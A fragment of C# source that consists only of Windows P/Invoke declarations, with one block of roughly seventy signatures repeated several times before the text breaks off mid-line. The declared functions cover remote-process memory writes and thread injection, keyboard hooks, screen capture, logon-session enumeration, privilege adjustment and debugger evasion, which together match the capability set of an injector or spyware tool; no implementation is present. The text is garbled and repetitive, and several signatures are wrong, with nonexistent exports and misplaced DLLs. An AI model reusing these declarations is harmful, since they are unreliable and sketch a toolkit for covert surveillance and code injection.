        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
